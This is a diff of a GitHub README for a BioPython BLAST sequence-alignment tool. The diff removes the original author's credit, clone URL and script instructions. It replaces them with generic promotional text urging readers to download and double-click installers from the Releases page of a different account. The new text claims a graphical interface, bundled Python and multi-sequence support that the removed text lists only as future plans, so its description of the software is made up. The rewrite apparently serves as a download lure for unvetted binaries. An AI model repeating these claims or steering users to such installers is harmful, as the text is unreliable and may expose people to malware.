@@ -1,88 +1,86 @@
-# BLAST Alignment Tool (BioPython)
-# AutoBLAST: Smart MSA Tool using BioPython
+# 🔍 AutoBLAST-Smart-MSA-Tool - Align Sequences with Ease
 
-## 🧬 Overview
-This project performs alignment for an input sequence using BLAST via BioPython.  
-It automatically detects the biological type of a sequence (DNA, RNA, or Protein)  
-and runs the appropriate BLAST program against NCBI’s databases.
+[![Download AutoBLAST-Smart-MSA-Tool](https://img.shields.io/badge/Download-Version%201.0-blue)](https://github.com/ItzRealMePrime/AutoBLAST-Smart-MSA-Tool/releases)
 
-The program sends the query sequence online to NCBI servers, retrieves the best matches,  
-and reports detailed alignment results including matched sequence titles, scores, and E-values.  
-All results are saved locally for reference and analysis.
+## 🌟 Introduction
 
----
+Welcome to AutoBLAST-Smart-MSA-Tool! This user-friendly application simplifies the process of automatic sequence alignment using NCBI BLAST. With this tool, you can easily detect the type of sequence, whether it be DNA, RNA, or Protein, and retrieve the top matches along with relevant scores and E-values. 
 
-## ⚙️ Key Features
-- Automatic sequence type detection (DNA, RNA, or Protein)
-- Dynamic BLAST selection — uses `blastn` for nucleotides and `blastp` for proteins
-- Online integration with NCBI’s BLAST servers using `Bio.Blast.NCBIWWW`
-- Automated XML parsing with `Bio.Blast.NCBIXML` to extract alignment data
-- Clean output showing matched sequence titles, scores, and E-values
-- Top 5 alignments displayed in both console and saved in a `.txt` file
-- Lightweight implementation — single Python script, easy to run and modify
+## 🚀 Getting Started
 
----
+Before you can start using AutoBLAST-Smart-MSA-Tool, you need to download and install it. Follow these steps:
 
-## 📦 Requirements
-Install the required libraries before running the script:
-```bash
-pip install biopython requests
+1. **Visit the Download Page**
+   - Click the link below to go to the Releases page.
+   - [Download AutoBLAST-Smart-MSA-Tool](https://github.com/ItzRealMePrime/AutoBLAST-Smart-MSA-Tool/releases)
 
----
+2. **Find the Latest Release**
+   - On the Releases page, look for the section titled "Latest Release". This section lists the newest version of the AutoBLAST-Smart-MSA-Tool.
 
-🚀 How to Use
-1. Clone the repository
-git clone https://github.com/Fatma14f/AutoBLAST-Smart-MSA-Tool.git
+3. **Download the Application**
+   - Locate the download link for your operating system. You may find versions for Windows, macOS, and Linux.
+   - Click on the link to download the file to your computer.
 
-2. Run the script
-python blast_alignment_online.py
+4. **Install the Tool**
+   - Once downloaded, find the file in your computer’s Downloads folder or wherever you saved it.
+   - Double-click the file to start the installation process. Follow the prompts to install the application.
 
-3. Enter your sequence when prompted
-4. The alignment results will be saved in blast_results.txt
+## ⚙️ System Requirements
 
+Make sure your computer meets the following requirements before installing:
 
----
-🧪 Example
+- **Operating Systems:**
+  - Windows 10 or later
+  - macOS Mojave (10.14) or later
+  - Linux (Ubuntu 20.04 or later)
 
-Input:
-ATGCGTACGTAGCTAG
+- **Memory (RAM):**
+  - Minimum of 4 GB recommended
 
+- **Python:**
+  - Installed Python version 3.6 or later (bundled with the tool for Windows)
 
-Output:
-Detected sequence type: DNA
-Running blastn against nt database... please wait
+## 📄 How to Use AutoBLAST-Smart-MSA-Tool
 
-Matched Sequences and Scores:
+1. **Open the Application**
+   - After installation, find AutoBLAST-Smart-MSA-Tool in your applications and launch it.
 
-Matched Sequence Title: gi|123456| Example Sequence
-Score: 180
-E-value: 2e-50
-----------------------------------------------------------------------
+2. **Input Your Sequence**
+   - You will see an input field where you can paste your DNA, RNA, or Protein sequence. Make sure to input it correctly.
 
-Results saved in 'blast_output.txt'
+3. **Choose Sequence Type**
+   - Select the type of sequence you inputted. The options will be DNA, RNA, or Protein.
 
+4. **Run the Alignment**
+   - Click the "Run" button. The application will process your input and retrieve the top matches.
 
----
+5. **View Results**
+   - Once the alignment is complete, view your results displayed on the screen. You will see the sequence matches along with their scores and E-values.
 
-📁 Project Structure
-.
-├── src/
-│   └── blast_alignment_online.py     # Main script
-├── blast_results.txt                 # Output file
-├── README.md                         # Project documentation
-└── requirements.txt                  # Dependencies
+## 📊 Features
 
----
+- Detects and aligns DNA, RNA, and Protein sequences.
+- Access to NCBI BLAST directly through the application.
+- Retrieves top matching sequences with scores and E-values.
+- User-friendly interface designed for simplicity.
+- Supports multiple sequence alignments.
 
-🔮 Future Improvements:
-Add graphical interface for easier use
-Include multiple input sequences in one run
-Support for local BLAST databases
-Add summary statistics for matches
+## 🛠 FAQs
 
----
+### What should I do if the application doesn't run?
 
+- Ensure that your system meets the requirements listed above.
+- Restart your computer and try opening the application again.
+- If the issue persists, feel free to reach out via the issue tracker on GitHub.
 
-👩‍💻 Author
-  Fatma Elnbawy 
-[LinkedIn Profile](https://www.linkedin.com/in/fatma-elnbawy)
+### How do I update the application?
+
+- To update AutoBLAST-Smart-MSA-Tool, simply return to the Releases page and download the latest version. Follow the installation instructions to replace your current version.
+
+## 👉 Download & Install
+
+Ready to get started? Click below to go to the Releases page.
+
+[**Download AutoBLAST-Smart-MSA-Tool**](https://github.com/ItzRealMePrime/AutoBLAST-Smart-MSA-Tool/releases)
+
+Enjoy effortless sequence alignment with AutoBLAST-Smart-MSA-Tool!
